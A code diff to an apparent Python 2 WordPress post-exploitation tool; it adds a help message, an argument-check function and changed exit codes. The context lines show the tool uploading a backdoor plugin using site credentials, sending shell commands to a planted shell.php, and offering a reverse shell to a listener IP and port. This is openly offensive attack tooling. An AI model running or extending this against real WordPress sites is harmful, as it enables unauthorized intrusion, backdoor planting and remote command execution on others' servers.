@@ -84,7 +84,10 @@ def commandloop(host,uploaddir):
         params = [('cmd', cmd)]
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
-        print "Sending command: " + cmd
+        if cmd == "help":
+            print "Except for the commands 'help', 'exit', and 'quit' the command will be ran on the remote host"
+        else:
+            print "Sending command: " + cmd
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
         print sendcommand.text
 
@@ -108,6 +111,20 @@ def printbanner():
     print banner
 
 
+def argcheck():
+    if args.interactive and args.reverse:
+        print "-i and -r are mutually exclusive"
+        sys.exit()
+
+    if args.interactive is False and args.reverse is False:
+        print "You must choose a type of shell: --reverse or --interactive"
+        sys.exit()
+
+    if "http" not in args.target:
+        print"Please include the protocol in the URL"
+        sys.exit()
+
+
 parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
 parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
 parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
@@ -119,11 +136,19 @@ parser.add_argument('-lp','--port',help='Listener Port', required=False)
 parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
 parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
 args = parser.parse_args()
-
 printbanner()
+argcheck()
 if args.interactive and args.reverse:
     print "-i and -r are mutually exclusive"
-    sys.exit(2)
+    sys.exit()
+
+if args.interactive is False and args.reverse is False:
+    print "You must choose a type of shell: --reverse or --interactive"
+    sys.exit()
+
+if "http" not in args.target:
+    print"Please include the protocol in the URL"
+    sys.exit()
 
 if args.interactive:
     if args.existing is None:
@@ -135,7 +160,7 @@ if args.interactive:
 if args.reverse:
     if args.ip is None or args.port is None:
         print "For a reverse shell, a listening IP and Port are required"
-        sys.exit(2)
+        sys.exit()
     if args.existing is None:
         uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse")
     else:
